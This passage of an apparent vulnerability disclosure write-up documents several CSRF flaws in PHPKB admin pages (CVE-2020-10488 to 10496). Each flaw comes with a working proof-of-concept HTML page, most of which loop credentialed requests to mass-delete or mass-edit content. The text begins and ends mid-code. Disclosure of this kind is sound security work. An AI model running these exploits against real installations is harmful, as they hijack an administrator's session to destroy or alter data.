		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">glossary</span> <span class="nx">terms</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">deleted</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-glossary.php?id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=del</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-deleting-a-news-article-cve-2020-10488">Cross-Site Request Forgery when deleting a news article (CVE-2020-10488)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-news.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “news” and click on “manage”;</li>
  <li>select the news article and click on “Delete”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">article</span> <span class="nx">news</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">deleted</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-news.php?id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=del</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-deleting-a-ticket-cve-2020-10489">Cross-Site Request Forgery when deleting a ticket (CVE-2020-10489)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-tickets.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “tickets” and click on “open”;</li>
  <li>click on “delete”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">tickets</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">deleted</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-tickets.php?id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=del</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-deleting-a-department-cve-2020-10490">Cross-Site Request Forgery when deleting a department (CVE-2020-10490)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-departments.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “tickets” and click on “departments”;</li>
  <li>select the department and click on “delete”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">news</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">deleted</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-departments.php?id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=del</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-adding-a-department-cve-2020-10491">Cross-Site Request Forgery when adding a department (CVE-2020-10491)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-departments.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “tickets” and click on “departments”;</li>
  <li>type a department name and click on “save”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- The name of the Department term is written in the name parameter --&gt;</span>
<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"document.createElement('form').submit.call(document.getElementById('myForm'))"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"[PHPKB]/admin/manage-departments.php"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">id=</span><span class="s">"myForm"</span> <span class="na">name=</span><span class="s">"myForm"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"name"</span> <span class="na">value=</span><span class="s">"dsa"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"show"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"submit&amp;#95;department"</span> <span class="na">value=</span><span class="s">"Save&amp;#32;Department"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-deleting-an-article-template-cve-2020-10492">Cross-Site Request Forgery when deleting an article template (CVE-2020-10492)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-templates.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “articles” and click on “article templates”;</li>
  <li>click on “delete”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">Article</span> <span class="nx">Templates</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">deleted</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-templates.php?status=&amp;id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=del</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-editing-a-glossary-term-cve-2020-10493">Cross-Site Request Forgery when editing a glossary term (CVE-2020-10493)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/edit-glossary.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “glossary” and click on “manage”;</li>
  <li>click on “edit” and then “save glossary”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- Change visible parameter to yes if you want to make the glossary terms public, else write no--&gt;</span>
<span class="c">&lt;!-- Change the term parameter to edit all the glossary terms' titles--&gt;</span>
<span class="c">&lt;!-- Change the definition parameter to change all the glossary terms' definition--&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span> <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">glossary</span> <span class="nx">terms</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">edited</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> 
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/edit-glossary.php</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">term=testterm&amp;definition=definitionterm&amp;visible=yes&amp;id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;p=c29ydD0mb3JkZXI9&amp;submit=Save</span><span class="dl">"</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-editing-a-news-article-cve-2020-10494">Cross-Site Request Forgery when editing a news article (CVE-2020-10494)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/edit-news.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “news” and click on “manage”;</li>
  <li>click on “edit” and then “save news article”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- Change make_visible to yes if you want to make the News public, else write no --&gt;</span>
<span class="c">&lt;!-- Change the title parameter to edit all the titles News --&gt;</span>
<span class="c">&lt;!-- Change the txtContent parameter to change all the News' description --&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span> <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">News</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">edited</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> 
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/edit-news.php</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">title=titlenews&amp;txtContent=descriptionnews&amp;make_visible=yes&amp;expiry_date=2020-01-24&amp;id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;p=c29ydD0mb3JkZXI9&amp;directsave=Save</span><span class="dl">"</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-editing-an-article-template-cve-2020-10495">Cross-Site Request Forgery when editing an article template (CVE-2020-10495)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/edit-template.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “articles” and click on “manage templates”;</li>
  <li>click on “edit” and then click on “save article template”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- Change type parameter to public if you want to make the categories public, else write private --&gt;</span>
<span class="c">&lt;!-- Change the title parameter to edit all the titles --&gt;</span>
<span class="c">&lt;!-- Change the txtContent parameter to change all the Article Templates' description --&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span> <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">Article</span> <span class="nx">Templates</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">edited</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> 
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/edit-template.php</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">title=sdasdasdasdasdasdasdasdaads&amp;txtContent=descriptioncontent&amp;author_id=1&amp;make_visible=active&amp;id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;p=c29ydD0mb3JkZXI9&amp;default=no&amp;directsave=Save</span><span class="dl">"</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-editing-an-article-cve-2020-10496">Cross-Site Request Forgery when editing an article (CVE-2020-10496)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/edit-article.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “articles” and click on “my articles”;</li>
  <li>click on “edit” and then click on “save article”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!--To change the article id, find \"article_id and change the id of the desired article --&gt;</span>
  <span class="nt">&lt;body&gt;</span>
  <span class="nt">&lt;script&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="kd">function</span> <span class="nx">submitRequest</span><span class="p">()</span>
      <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]</span><span class="se">\</span><span class="s2">/admin</span><span class="se">\</span><span class="s2">/save-article.php</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Accept</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">text</span><span class="se">\</span><span class="s2">/html,application</span><span class="se">\</span><span class="s2">/xhtml+xml,application</span><span class="se">\</span><span class="s2">/xml;q=0.9,image</span><span class="se">\</span><span class="s2">/webp,*</span><span class="se">\</span><span class="s2">/*;q=0.8</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Accept-Language</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">multipart</span><span class="se">\</span><span class="s2">/form-data; boundary=---------------------------3042735397090</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">type</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">public</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">se_able_public_1</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">1</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
